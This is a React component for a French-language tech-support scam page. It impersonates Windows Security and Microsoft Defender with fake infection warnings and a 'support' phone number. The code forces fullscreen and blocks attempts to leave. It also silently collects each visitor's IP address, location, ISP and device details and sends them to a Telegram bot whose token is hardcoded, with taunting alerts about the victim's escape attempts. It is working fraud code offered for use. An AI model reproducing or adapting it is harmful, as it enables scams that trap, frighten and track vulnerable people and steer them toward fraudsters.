import React, { useEffect, useState } from 'react';
import './index-Deu3tZvB.css';

const WindowsLockSim: React.FC = () => {
  const [currentIndex, setCurrentIndex] = useState(0);
  const [escapeAttempts, setEscapeAttempts] = useState(0);
  const [showEscapeWarning, setShowEscapeWarning] = useState(false);
  const [isFlashing, setIsFlashing] = useState(false);
  const [notificationSent, setNotificationSent] = useState(false);

  // Telegram bot configuration - REPLACE WITH YOUR OWN CREDENTIALS
  const TELEGRAM_BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
  const TELEGRAM_CHAT_ID = '-1003737910762';

  // Function to send Telegram notification
  const sendTelegramNotification = async (message: string) => {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || notificationSent) return;
    
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (response.ok) {
        console.log('Telegram notification sent successfully');
        setNotificationSent(true);
      }
    } catch (error) {
      console.error('Failed to send Telegram notification:', error);
    }
  };

  // Function to get user info
  const getUserInfo = async () => {
    try {
      // Get IP address and geolocation
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const ip = ipData.ip;
      
      let country = 'Unknown';
      let city = 'Unknown';
      let region = 'Unknown';
      let isp = 'Unknown';
      let timezone = 'Unknown';
      
      try {
        // First API
        const geoResponse1 = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData1 = await geoResponse1.json();
        
        if (geoData1) {
          country = geoData1.country_name || geoData1.country || 'Unknown';
          city = geoData1.city || 'Unknown';
          region = geoData1.region || 'Unknown';
          isp = geoData1.org || 'Unknown';
          timezone = geoData1.timezone || 'Unknown';
        }
      } catch (error) {
        try {
          // Fallback API
          const geoResponse2 = await fetch(`https://ipinfo.io/${ip}/json`);
          const geoData2 = await geoResponse2.json();
          
          if (geoData2) {
            country = geoData2.country || 'Unknown';
            city = geoData2.city || 'Unknown';
            region = geoData2.region || 'Unknown';
            isp = geoData2.org || 'Unknown';
            timezone = geoData2.timezone || 'Unknown';
          }
        } catch (error2) {
          console.log('Both geolocation APIs failed');
        }
      }
      
      // Get local time
      const now = new Date();
      const localTime = now.toLocaleString();
      const timezoneOffset = now.getTimezoneOffset();
      
      // If timezone is still unknown, calculate from offset
      if (timezone === 'Unknown') {
        timezone = `UTC${timezoneOffset >= 0 ? '-' : '+'}${Math.abs(timezoneOffset) / 60}`;
      }
      
      return {
        ip: ip,
        country: country,
        location: `${city}, ${region}`,
        isp: isp,
        timezone: timezone,
        local_time: localTime,
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        referrer: document.referrer || 'Direct visit',
        browser_name: navigator.appName,
        browser_version: navigator.appVersion.split(' ')[0],
        cookies_enabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online_status: navigator.onLine ? 'Online' : 'Offline'
      };
    } catch (error) {
      console.error('Failed to get user info:', error);
      const now = new Date();
      return {
        ip: 'Unknown',
        country: 'Unknown',
        location: 'Unknown',
        isp: 'Unknown',
        timezone: 'Unknown',
        local_time: now.toLocaleString(),
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        referrer: document.referrer || 'Direct visit',
        browser_name: navigator.appName,
        browser_version: navigator.appVersion.split(' ')[0],
        cookies_enabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online_status: navigator.onLine ? 'Online' : 'Offline'
      };
    }
  };

  // Function to send initial visit notification
  const sendInitialNotification = async () => {
    if (notificationSent) return;
    
    try {
      const userInfo = await getUserInfo();
      
      const message = `
🎯 <b>NEW VISITOR CAPTURED</b> 🎯

<b>🌐 NETWORK INFORMATION:</b>
🆔 IP Address: <code>${userInfo.ip}</code>
🗺️ Country: ${userInfo.country}
📍 Location: ${userInfo.location}
📡 ISP: ${userInfo.isp}
🕐 TimeZone: ${userInfo.timezone}
⏰ Local Time: ${userInfo.local_time}

<b>💻 DEVICE INFORMATION:</b>
🖥️ Platform: ${userInfo.platform}
🌐 Browser: ${userInfo.user_agent.substring(0, 100)}...
🔤 Language: ${userInfo.language}
📱 Screen: ${userInfo.screen}
🔗 Referrer: ${userInfo.referrer}

<b>🔧 TECHNICAL DETAILS:</b>
🔌 Online Status: ${userInfo.online_status}
🍪 Cookies: ${userInfo.cookies_enabled}
🧭 Browser Name: ${userInfo.browser_name}
📊 Browser Version: ${userInfo.browser_version}

<b>📊 PAGE STATUS:</b>
🔐 Fullscreen: Active
🎵 Audio: Playing
🔄 Panels: Cycling
⏱️ Visit Time: ${new Date().toLocaleTimeString()}

<b>🚨 IMPORTANT:</b>
⚠️ User entered Windows Lock Simulation
⚠️ Screen locked in fullscreen mode
⚠️ Security alerts displayed
⚠️ Phone number visible: 28 80 45 50
      `;
      
      sendTelegramNotification(message);
    } catch (error) {
      console.error('Failed to send initial notification:', error);
    }
  };

  useEffect(() => {
    const audio = document.getElementById('background-audio') as HTMLAudioElement;

    const enterFullscreen = () => {
      const element = document.documentElement;
      if (element.requestFullscreen) {
        element.requestFullscreen().catch(e => console.log("Fullscreen error:", e));
      } else if ((element as any).mozRequestFullScreen) {
        (element as any).mozRequestFullScreen();
      } else if ((element as any).webkitRequestFullscreen) {
        (element as any).webkitRequestFullscreen();
      } else if ((element as any).msRequestFullscreen) {
        (element as any).msRequestFullscreen();
      }
    };

    const startAudio = () => {
      if (audio) {
        audio.play().catch(e => {
          console.log("Audio playback failed:", e);
          const startAudioOnClick = () => {
            audio.play();
            document.removeEventListener('click', startAudioOnClick);
          };
          document.addEventListener('click', startAudioOnClick, { once: true });
        });
      }
    };

    // Handle escape key - make it difficult to exit
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        
        // Visual feedback
        setIsFlashing(true);
        setTimeout(() => setIsFlashing(false), 300);
        
        // Increment escape attempts
        setEscapeAttempts(prev => {
          const newAttempts = prev + 1;
          
          // Send escape attempt notification
          if (newAttempts === 1) {
            getUserInfo().then(userInfo => {
              const escapeMessage = `
⚠️ <b>ESCAPE ATTEMPT DETECTED</b> ⚠️

<b>🔍 USER TRYING TO ESCAPE:</b>
🆔 IP: <code>${userInfo.ip}</code>
📍 Location: ${userInfo.location}
🌍 Country: ${userInfo.country}
⏰ Local Time: ${userInfo.local_time}

<b>📊 ESCAPE STATUS:</b>
🔓 Attempts: ${newAttempts}/5 needed to exit
🎯 Current Panel: Panel ${currentIndex + 1}/5
⏱️ Time on Page: ${Math.floor(performance.now() / 1000)} seconds

<b>📱 DEVICE INFO:</b>
🖥️ Platform: ${userInfo.platform}
🌐 Browser: ${userInfo.user_agent.substring(0, 80)}...
📡 ISP: ${userInfo.isp}

<b>🚨 ACTION:</b>
🔒 Fullscreen still active
⚠️ Warning displayed to user
📞 Support number: 28 80 45 50
              `;
              sendTelegramNotification(escapeMessage);
            });
          }
          
          // Show warning after 2 attempts
          if (newAttempts >= 2) {
            setShowEscapeWarning(true);
            
            // Send warning notification for multiple attempts
            if (newAttempts === 3) {
              const warningMessage = `
🚨 <b>PERSISTENT ESCAPE ATTEMPTS</b> 🚨

User is persistently trying to escape!
🆔 IP: Getting desperate...
📍 Location: Still trapped
🔓 Attempts: ${newAttempts}/5
⏱️ Duration: ${Math.floor(performance.now() / 1000)}s

<b>STATUS:</b>
🔒 Fullscreen: Still locked
📞 User sees phone number
⚠️ Security alerts active
              `;
              sendTelegramNotification(warningMessage);
            }
            
            // Hide warning after 3 seconds
            setTimeout(() => {
              setShowEscapeWarning(false);
            }, 3000);
          }
          
          // Only exit after 5 escape attempts
          if (newAttempts >= 5) {
            // Send final exit notification
            getUserInfo().then(userInfo => {
              const exitMessage = `
✅ <b>USER SUCCESSFULLY EXITED</b> ✅

<b>📊 FINAL STATS:</b>
🆔 IP: <code>${userInfo.ip}</code>
📍 Location: ${userInfo.location}
🌍 Country: ${userInfo.country}
📡 ISP: ${userInfo.isp}
🕐 TimeZone: ${userInfo.timezone}
⏰ Exit Time: ${userInfo.local_time}
⏱️ Total Duration: ${Math.floor(performance.now() / 1000)} seconds
🔓 Escape Attempts: ${newAttempts} required

<b>💻 DEVICE USED:</b>
🖥️ Platform: ${userInfo.platform}
🌐 User Agent: ${userInfo.user_agent.substring(0, 80)}...
🔤 Language: ${userInfo.language}
📱 Screen: ${userInfo.screen}

<b>📞 PHONE NUMBER SEEN:</b>
28 80 45 50 (Displayed ${currentIndex + 1} times)

<b>🎯 RESULT:</b>
User saw all security panels
User attempted escape ${newAttempts} times
User was locked for ${Math.floor(performance.now() / 1000)} seconds
              `;
              sendTelegramNotification(exitMessage);
            });
            
            // Allow exit on 5th attempt
            setTimeout(() => {
              if (document.exitFullscreen) {
                document.exitFullscreen();
              } else if ((document as any).mozCancelFullScreen) {
                (document as any).mozCancelFullScreen();
              } else if ((document as any).webkitExitFullscreen) {
                (document as any).webkitExitFullscreen();
              } else if ((document as any).msExitFullscreen) {
                (document as any).msExitFullscreen();
              }
            }, 1000);
            return 0;
          }
          
          return newAttempts;
        });
      }
      
      // Also block F11 key
      if (e.key === 'F11' || e.keyCode === 122) {
        e.preventDefault();
        e.stopPropagation();
        setShowEscapeWarning(true);
        setTimeout(() => setShowEscapeWarning(false), 2000);
      }
    };

    // Also prevent right-click context menu
    const handleContextMenu = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };

    // Prevent Ctrl+W, Ctrl+Q, etc.
    const handleKeyCombo = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && (e.key === 'w' || e.key === 'W' || e.key === 'q' || e.key === 'Q')) {
        e.preventDefault();
        setShowEscapeWarning(true);
        setTimeout(() => setShowEscapeWarning(false), 2000);
      }
    };

    // Click anywhere to enter fullscreen and start audio
    const handleClick = () => {
      enterFullscreen();
      startAudio();
      
      // Send initial notification after 2 seconds
      setTimeout(sendInitialNotification, 2000);
      
      // Add event listeners after fullscreen
      document.addEventListener('keydown', handleKeyDown);
      document.addEventListener('keydown', handleKeyCombo);
      document.addEventListener('contextmenu', handleContextMenu);
      
      // Prevent F11 and other fullscreen exit methods
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement) {
          setTimeout(enterFullscreen, 100);
        }
      });
    };
    
    document.addEventListener('click', handleClick, { once: true });

    // Change panel every 1 second
    const interval = setInterval(() => {
      setCurrentIndex(prev => (prev + 1) % 5);
    }, 1000);

    // Also try to start audio on page load
    setTimeout(startAudio, 1000);

    return () => {
      clearInterval(interval);
      document.removeEventListener('click', handleClick);
      document.removeEventListener('keydown', handleKeyDown);
      document.removeEventListener('keydown', handleKeyCombo);
      document.removeEventListener('contextmenu', handleContextMenu);
    };
  }, [currentIndex, notificationSent]);

  return (
    <>
      <style>
        {`
          .escape-warning-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 20px;
            animation: warningPulse 0.5s ease-in-out;
          }
          
          .escape-warning-content {
            background: #c00;
            padding: 30px;
            border-radius: 10px;
            border: 3px solid white;
            max-width: 600px;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.7);
          }
          
          .escape-warning-title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #fff;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
          }
          
          .escape-warning-text {
            font-size: 18px;
            margin-bottom: 10px;
            line-height: 1.4;
          }
          
          .escape-attempts {
            font-size: 16px;
            margin-top: 15px;
            color: #ff0;
            font-weight: bold;
          }
          
          @keyframes warningPulse {
            0% { opacity: 0; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1); }
          }
          
          .sequence-panel {
            display: none;
          }
          .sequence-panel.active {
            display: block;
          }
          
          body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
          }
          #root {
            width: 100%;
            height: 100%;
          }
          
          .fake-screen.flashing {
            animation: flashRed 0.3s ease-in-out;
          }
          
          @keyframes flashRed {
            0%, 100% { 
              filter: brightness(1); 
              background-color: transparent;
            }
            50% { 
              filter: brightness(1.5) sepia(1) hue-rotate(-30deg);
              background-color: rgba(255, 0, 0, 0.3);
            }
          }
          
          .lock-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(255,0,0,0.1), rgba(0,0,255,0.1));
            z-index: 9998;
            pointer-events: none;
          }
        `}
      </style>

      {showEscapeWarning && (
        <div className="escape-warning-overlay">
          <div className="escape-warning-content">
            <div className="escape-warning-title">🚨 SÉCURITÉ WINDOWS - ACCÈS REFUSÉ 🚨</div>
            <div className="escape-warning-text">La sortie du mode plein écran est temporairement désactivée.</div>
            <div className="escape-warning-text">Des menaces critiques ont été détectées sur votre système.</div>
            <div className="escape-warning-text">Pour votre protection, le système restera en mode plein écran pendant l'analyse.</div>
            <div className="escape-attempts">Tentatives de sortie détectées: {escapeAttempts}/5 nécessaires</div>
            <div className="escape-warning-text" style={{ marginTop: '20px', fontSize: '14px', color: '#ffcc00' }}>
              Pour obtenir de l'aide, contactez le support technique au: <br />
              <strong style={{ fontSize: '20px' }}>📞 28 80 45 50</strong>
            </div>
          </div>
        </div>
      )}

      <div className="lock-overlay"></div>

      <audio id="background-audio" loop>
        <source src="/vocal1-BYq15bXr.mp3" type="audio/mpeg" />
      </audio>

      <div className={`fake-screen ${isFlashing ? 'flashing' : ''}`} style={{ 
        backgroundImage: 'url("/windows-lock-sim_files/window_lock-CQufc91c.png")', 
        backgroundSize: 'cover', 
        backgroundPosition: 'center center', 
        backgroundRepeat: 'no-repeat' 
      }}>
        {/* Panel 1 */}
        <div className={`security-panel panel-animate sequence-panel ${currentIndex === 0 ? 'active' : ''}`}>
          <div className="security-header">
            <div className="security-left">
              <img alt="Windows" className="windows-logo" src="/windows-lock-sim_files/windows_logo-CziNPXKD.png" />
              <span className="security-title">Sécurité Windows</span>
            </div>
            <div className="window-controls">
              <button className="control-btn minimize">−</button>
              <button className="control-btn maximize">□</button>
              <button className="control-btn close">✕</button>
            </div>
          </div>
          <div className="security-content">
            <div className="security-main">
              <div className="security-status">
                <div className="status-icon warning">⚠️</div>
                <div className="status-text">
                  <h3>Protection désactivée</h3>
                  <p>Votre ordinateur est vulnérable</p>
                </div>
              </div>
              <div className="security-actions-panel">
                <button className="security-action-btn primary">Activer la protection en temps réel</button>
                <button className="security-action-btn">Démarrer l'analyse rapide</button>
              </div>
              <div className="security-info">
                <div className="info-row">
                  <span>Protection antivirus</span>
                  <span className="status-off">Désactivée</span>
                </div>
                <div className="info-row">
                  <span>Pare-feu</span>
                  <span className="status-on">Activé</span>
                </div>
                <div className="info-row">
                  <span>Dernière analyse</span>
                  <span>Il y a 7 jours</span>
                </div>
              </div>
            </div>
            <div className="security-sidebar">
              <span className="security-message">Activer la licence</span>
            </div>
          </div>
        </div>

        {/* Panel 2 */}
        <div className={`analyse-panel panel-animate sequence-panel ${currentIndex === 1 ? 'active' : ''}`}>
          <div className="analyse-header">
            <div className="analyse-left">
              <div className="analyse-icon">🔍</div>
              <span className="analyse-title">Analyse de sécurité</span>
            </div>
            <div className="window-controls">
              <button className="control-btn minimize">−</button>
              <button className="control-btn maximize">□</button>
              <button className="control-btn close">✕</button>
            </div>
          </div>
          <div className="analyse-content">
            <div className="analyse-main">
              <div className="scan-results">
                <div className="result-header">
                  <h3>Résultats de l'analyse</h3>
                  <span className="scan-time">Terminée à 14:32</span>
                </div>
                <div className="threats-found">
                  <div className="threat-count">
                    <span className="count">47</span>
                    <span className="label">Menaces détectées</span>
                  </div>
                </div>
                <div className="threat-list">
                  <div className="threat-item">
                    <span className="threat-name">Trojan:Win32/Emotet.A</span>
                    <span className="threat-level high">Élevé</span>
                  </div>
                  <div className="threat-item">
                    <span className="threat-name">Adware:Win32/RelevantKnowledge</span>
                    <span className="threat-level medium">Moyen</span>
                  </div>
                  <div className="threat-item">
                    <span className="threat-name">PUA:Win32/InstallCore</span>
                    <span className="threat-level low">Faible</span>
                  </div>
                </div>
                <div className="action-buttons">
                  <button className="action-btn danger">Nettoyer maintenant</button>
                  <button className="action-btn">Quarantaine</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Panel 3 */}
        <div className={`defender-panel panel-animate sequence-panel ${currentIndex === 2 ? 'active' : ''}`}>
          <div className="defender-header">
            <span className="defender-title">Windows Defender</span>
            <div className="window-controls">
              <button className="control-btn minimize">−</button>
              <button className="control-btn maximize">□</button>
              <button className="control-btn close">✕</button>
            </div>
          </div>
          <div className="defender-content">
            <span className="defender-message">L'accès à ce PC a été bloqué pour des raisons de sécurité</span>
          </div>
          <div className="defender-buttons">
            <button className="defender-btn">Annuler</button>
            <button className="defender-btn primary">D'ACCORD</button>
          </div>
        </div>

        {/* Panel 4 */}
        <div className={`defender-popup-wrapper sequence-panel ${currentIndex === 3 ? 'active' : ''}`}>
          <div className="defender-popup">
            <div className="defender-popup-header">
              <div className="defender-popup-left">
                <div className="defender-logo">🛡️</div>
                <span className="defender-popup-title">Microsoft Défenseur</span>
              </div>
              <div className="defender-popup-controls">
                <button className="popup-control-btn minimize">−</button>
                <button className="popup-control-btn maximize">□</button>
                <button className="popup-control-btn close">✕</button>
              </div>
            </div>
            <div className="defender-popup-content">
              <div className="popup-main-message">
                <h2 className="popup-title">Désolé, l'analyse n'est pas terminée !</h2>
                <div className="error-code">Erreur: Ox800VDS</div>
                <div className="popup-description">Microsoft Defender a trouvé des fichiers infectés mais n'a pas pu les supprimer en raison des autorisations des stratégies de groupe. Veuillez scanner maintenant pour les supprimer manuellement.</div>
                <div className="popup-icons">
                  <div className="popup-icon">📄</div>
                  <div className="popup-icon">📁</div>
                  <div className="popup-icon">🔍</div>
                </div>
                <div className="support-section">
                  <div className="support-text">Appeler le support pour obtenir de l'aide</div>
                  <div className="support-label">Prise en charge de Windows</div>
                </div>
                <div className="popup-buttons">
                  <div className="windows-security-badge">
                    <div className="windows-logo">🏠</div>
                    <span>Sécurité Windows</span>
                  </div>
                  <button className="scan-button primary">Scanne maintenant</button>
                  <button className="scan-button secondary">Scanner plus tard</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Panel 5 */}
        <div className={`admin-modal-wrapper sequence-panel ${currentIndex === 4 ? 'active' : ''}`}>
          <div className="admin-modal">
            <div className="modal-header">
              <span>Connexion administrateur</span>
              <button className="close-btn">✕</button>
            </div>
            <div className="modal-body">
              <p className="warning-text">Windows verrouillé en raison d'une activité inhabituelle.</p>
              <p className="instruction-text">Veuillez vous reconnecter à l'aide de votre identifiant Microsoft et de votre mot de passe.</p>
              <p className="support-text">Pour obtenir de l'aide, contactez le support Microsoft</p>
              <div className="support-number">28 80 45 50</div>
              <input placeholder="Nom d'utilisateur" disabled type="text" />
              <input placeholder="Mot de passe" disabled type="password" />
              <button className="submit-btn" disabled>valeur</button>
            </div>
          </div>
        </div>
      </div>

      <div className="fullscreen-notification">
        <div className="notification-bar">Alerte maximale de sécurité. Message IMPORTANT du service de sécurité informatique. Une INFECTION GRAVE a été détectée sur votre ordinateur. Des comportements suspects indiquent une compromission sérieuse de vos données. Vos informations personnelles, vos coordonnées bancaires et vos identifiants sont potentiellement en danger. Il existe un risque réel et IMMINENT de vol d'identité et d'utilisation frauduleuse de vos comptes. Ne tentez pas de résoudre ceci seul. Contactez IMMÉDIATEMENT le service technique au numéro indiqué sur cette page pour obtenir une intervention urgente. Ne saisissez aucun mot de passe, n'effectuez aucun paiement et n'autorisez aucune demande de confirmation tant que notre technicien ne vous l'a pas confirmé. Ce message est prioritaire — agissez maintenant pour protéger vos données. Contactez sans délai le service technique pour une prise en charge immédiate et évitez toute manipulation qui pourrait aggraver la situation.</div>
      </div>

      <div className="virus-popup">
        <div className="virus-popup-header">
          <span className="virus-icon">⚠️</span>
          <span className="virus-title">VIRUS DÉTECTÉ!</span>
          <span className="close-btn">×</span>
        </div>
        <div className="virus-popup-content">
          <div className="gif-container">
            <img alt="Transfer en cours" className="transfer-gif" src="transfer-CVD-3X68.gif" />
          </div>
          <div className="virus-text">
            <h3>🚨 ALERTE CRITIQUE 🚨</h3>
            <p><strong>Virus Trojan.Win32.Danger détecté!</strong></p>
            <p>Vos données sont en cours de transfert...</p>
            <p className="warning-text">⚡ ARRÊTEZ IMMÉDIATEMENT toute activité!</p>
            <p className="phone-number">📞 Appelez: <strong>28 80 45 50</strong></p>
          </div>
        </div>
        <div className="virus-popup-footer">
          <div className="progress-bar">
            <div className="progress-fill"></div>
          </div>
          <p>Transfert de données: 47%...</p>
        </div>
      </div>

      <div className="security-alert-popup">
        <div className="security-alert-header">
          <span className="alert-icon">🔒</span>
          <span className="alert-title">SÉCURITÉ</span>
        </div>
        <div className="security-alert-content">
          <div className="alert-status">
            <div className="status-indicator"></div>
            <span className="status-text">SYSTÈME BLOQUÉ</span>
          </div>
          <div className="alert-info">
            <p className="danger-text">⚠️ DANGER ⚠️</p>
            <p className="info-text">Accès bloqué</p>
            <p className="info-text">Code: 0x80070005</p>
          </div>
          <div className="support-box">
            <p className="support-label">Support Microsoft</p>
            <p className="support-number">28 80 45 50</p>
          </div>
        </div>
        <div className="security-alert-footer">
          <div className="threat-level">
            <span className="threat-label">Niveau de menace:</span>
            <span className="threat-value">CRITIQUE</span>
          </div>
        </div>
      </div>

      <div className="support-popup">
        <div className="support-bubble">
          <div className="microsoft-header">
            <div className="microsoft-logo">
              <div className="logo-square red"></div>
              <div className="logo-square green"></div>
              <div className="logo-square blue"></div>
              <div className="logo-square yellow"></div>
            </div>
            <span className="microsoft-text">Microsoft</span>
          </div>
          <div className="support-content">
            <p className="support-title">Assistance technique Windows</p>
            <div className="phone-section">
              <div className="phone-number">28 80 45 50</div>
              <div className="phone-subtitle">( Numéro sans frais)</div>
            </div>
          </div>
          <div className="bubble-arrow"></div>
        </div>
        <div className="support-footer">
          <span className="footer-text">Windows Defender SmartScreen</span>
        </div>
      </div>
    </>
  );
};

export default WindowsLockSim;

